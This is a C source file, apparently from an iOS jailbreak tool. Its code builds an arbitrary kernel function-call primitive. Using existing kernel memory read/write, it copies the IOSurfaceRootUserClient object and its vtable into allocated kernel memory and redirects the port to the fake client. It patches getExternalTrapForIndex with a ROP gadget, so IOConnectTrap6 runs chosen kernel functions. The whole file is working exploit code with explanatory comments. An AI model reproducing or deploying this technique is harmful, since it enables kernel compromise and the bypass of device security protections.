#include <pthread.h>

#include "kern_utils.h"
#include "common.h"
#include "kexecute.h"
#include "kmem.h"
#include "offsetof.h"

mach_port_t prepare_user_client() {
    kern_return_t err;
    mach_port_t user_client;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL) {
        DEBUGLOG(" [-] unable to find service");
        exit(EXIT_FAILURE);
    }
    
    err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS) {
        DEBUGLOG(" [-] unable to get user client connection");
        exit(EXIT_FAILURE);
    }
    
    DEBUGLOG("got user client: 0x%x", user_client);
    return user_client;
}

// TODO: Consider removing this - jailbreakd runs all kernel ops on the main thread
pthread_mutex_t kexecute_lock;
static mach_port_t user_client;
static uint64_t IOSurfaceRootUserClient_port;
static uint64_t IOSurfaceRootUserClient_addr;
static uint64_t fake_vtable;
static uint64_t fake_client;
const int fake_kalloc_size = 0x1000;

void init_kexecute() {
    user_client = prepare_user_client();
    
    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
    
    IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
    
    uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
    
    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
    
    // Create the vtable in the kernel memory, then copy the existing vtable into there
    fake_vtable = kalloc(fake_kalloc_size);
    
    for (int i = 0; i < 0x200; i++) {
        wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
    }
    
    // Create the fake user client
    fake_client = kalloc(fake_kalloc_size);
    
    for (int i = 0; i < 0x200; i++) {
        wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
    }
    
    // Write our fake vtable into the fake user client
    wk64(fake_client, fake_vtable);
    
    // Replace the user client with ours
    wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, fake_client);
    
    // Now the userclient port we have will look into our fake user client rather than the old one
    
    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    wk64(fake_vtable+8*0xB7, offset_add_ret_gadget);
    
    pthread_mutex_init(&kexecute_lock, NULL);
}

void term_kexecute() {
    wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, IOSurfaceRootUserClient_addr);
    kfree(fake_vtable, fake_kalloc_size);
    kfree(fake_client, fake_kalloc_size);
}

uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    pthread_mutex_lock(&kexecute_lock);
    
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.
    
    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
    
    uint64_t offx20 = rk64(fake_client+0x40);
    uint64_t offx28 = rk64(fake_client+0x48);
    wk64(fake_client+0x40, x0);
    wk64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    wk64(fake_client+0x40, offx20);
    wk64(fake_client+0x48, offx28);
    
    pthread_mutex_unlock(&kexecute_lock);
    
    return returnval;
}
